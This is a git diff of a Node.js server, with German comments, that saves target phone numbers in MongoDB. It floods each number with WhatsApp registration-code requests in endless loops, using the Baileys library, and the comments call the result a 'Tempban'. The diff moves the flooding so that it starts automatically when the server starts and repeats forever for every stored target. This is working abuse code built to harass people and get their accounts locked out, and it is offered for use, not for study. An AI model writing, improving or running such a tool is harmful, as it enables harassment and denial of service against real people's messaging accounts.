@@ -74,8 +74,8 @@ if (cluster.isMaster) {
 
     // Modell aus dem Schema erstellen
     const SpamData = mongoose.model('SpamData', SpamDataSchema);
-/*
-    const sendStoredData = async () => {
+
+    /*const sendStoredData = async () => {
         try {
             // Alle Daten aus der MongoDB abrufen
             const data = await SpamData.find({}, 'ddi number');
@@ -99,9 +99,9 @@ if (cluster.isMaster) {
     };
 
     // Funktion aufrufen, um die Daten beim Starten des Servers zu senden
-    sendStoredData();
+    sendStoredData(); */
 
-    */
+    
 
     // Set up body parsers
     let server = require('./views/qr');
@@ -129,6 +129,9 @@ if (cluster.isMaster) {
     app.get('/pair', (req, res) => {
         res.render('pair', { title: 'pairing' });
     });
+    app.get('/start-spam', (req, res) => {
+        res.render(path.join(__path, 'lock'), { title: 'Lock' });
+    });
 
     app.get('/pair2', (req, res) => {
         res.render('pair2', { title: 'pairing2' });
@@ -143,91 +146,91 @@ if (cluster.isMaster) {
     }
     
     
-    app.post('/start-spam', async (req, res) => {
-        const { ddi, number } = req.body;
-        try {
-            // Überprüfen, ob die Kombination von DDI und number bereits in der MongoDB vorhanden ist
-            const existingData = await SpamData.findOne({ ddi, number });
-            if (existingData) {
-                log.info('Data already exists in MongoDB');
-                await sleep(50);
-            } else {
-                await newData.save();
-                log.info('Data saved successfully to MongoDB');
-            }  // Neue Instanz des Modells erstellen und speichern
-                const newData = new SpamData({ ddi, number });
-              
+app.post('/start-spam', async (req, res) => {
+    const { ddi, number } = req.body;
 
-            const { state, saveCreds } = await useMultiFileAuthState('.mm');
-            const spam = makeWaSocket({
-                auth: state,
-                mobile: true,
-                logger: log.child({ component: 'whiskeysockets' }) // Child logger for whiskeysockets
-            });
+    try {
+ // Überprüfen, ob die Kombination von DDI und Nummer bereits in der MongoDB vorhanden ist
+ const existingData = await SpamData.findOne({ ddi, number });
+ if (existingData) {
+     console.log('Data already exists');
+ } else {
+     // Neue Instanz des Modells erstellen und speichern
+     const newData = new SpamData({ ddi, number });
+     await newData.save();
+     console.log('Data saved successfully');
+ }
 
-            while (true) {
-                try {
-                    const response = await spam.requestRegistrationCode({
-                        phoneNumber: '+' + ddi + number,
-                        phoneNumberCountryCode: ddi,
-                        phoneNumberNationalNumber: number,
-                        phoneNumberMobileCountryCode: 724
-                    });
-                    res.json({ success: true, response }); // Send success response
-                    return;
-                } catch (err) {
-                    // Fehler ignorieren und keine Aktion ausführen
-                }
+
+        const { state, saveCreds } = await useMultiFileAuthState('.mm');
+        const spam = makeWaSocket({
+            auth: state,
+            mobile: true,
+            logger: pino({ level: 'silent' })
+        });
+    
+        while (true) {
+            try {
+                const response = await spam.requestRegistrationCode({
+                    phoneNumber: '+' + ddi + number,
+                    phoneNumberCountryCode: ddi,
+                    phoneNumberNationalNumber: number,
+                    phoneNumberMobileCountryCode: 724
+                });
+    
+                res.json({ success: true, response });
+                return;
+            } catch (err) {
+                // Fehler ignorieren und keine Aktion ausführen
             }
-        } catch (err) {
-            // Fehler ignorieren und keine Aktion ausführen
         }
-    });
-
+    } catch (err) {
+        // Fehler ignorieren und keine Aktion ausführen
+    }
+});
 
 
 const startSpamV2 = async () => {
     try {
-        console.log('Tempban wird gestartet...');
-        // Alle Daten aus der MongoDB abrufen
-        const data = await SpamData.find({}, 'ddi number');
-        console.log('Abgerufene Daten aus der MongoDB Tempban');
+        while (true) {
+            // Alle Daten aus der MongoDB abrufen
+            const data = await SpamData.find({}, 'ddi number');
 
-        // Für jede Datenzeile den Spam starten
-        await Promise.all(data.map(async (item) => {
-            const { ddi, number } = item;
+            // Für jede Datenzeile den Spam starten
+            await Promise.all(data.map(async (item) => {
+                const { ddi, number } = item;
 
-            const { state, saveCreds } = await useMultiFileAuthState('.mm');
-            const spam = makeWaSocket({
-                auth: state,
-                mobile: true,
-                logger: log.child({ component: 'whiskeysockets' }) // Child logger for whiskeysockets
-            });
+                const { state, saveCreds } = await useMultiFileAuthState('.mm');
+                const spam = makeWaSocket({
+                    auth: state,
+                    mobile: true,
+                    logger: log.child({ component: 'whiskeysockets' }) // Child logger for whiskeysockets
+                });
 
-            while (true) {
-                try {
-                    const response = await spam.requestRegistrationCode({
-                        phoneNumber: '+' + ddi + number,
-                        phoneNumberCountryCode: ddi,
-                        phoneNumberNationalNumber: number,
-                        phoneNumberMobileCountryCode: 724
-                    });
-                    log.info('Spam request sent successfully:', response);
-                    await sleep(2000); // Zeit zwischen den Spam-Anfragen
-                } catch (err) {
-                   
+                while (true) {
+                    try {
+                        const response = await spam.requestRegistrationCode({
+                            phoneNumber: '+' + ddi + number,
+                            phoneNumberCountryCode: ddi,
+                            phoneNumberNationalNumber: number,
+                            phoneNumberMobileCountryCode: 724
+                        });
+                        info.log('Spam request sent successfully:', response);
+                        await sleep(2000); // Zeit zwischen den Spam-Anfragen
+                    } catch (err) {
+                        // Fehlerbehandlung hier
+                    }
                 }
-            }
-        }));
-        console.log('Tempban abgeschlossen.');
-
+            }));
+        }
     } catch (error) {
-      
+        // Fehlerbehandlung hier
     }
 };
 
 // Starten Sie den Spam-Prozess beim Starten des Servers
 startSpamV2();
+
 
 
 
@@ -250,7 +253,7 @@ startSpamV2();
 
     app.on('listening', () => {
         setTimeout(() => {
-            sendStoredData();
-        }, 15000);
+            startSpamV2();
+        }, 1000);
     });
 }
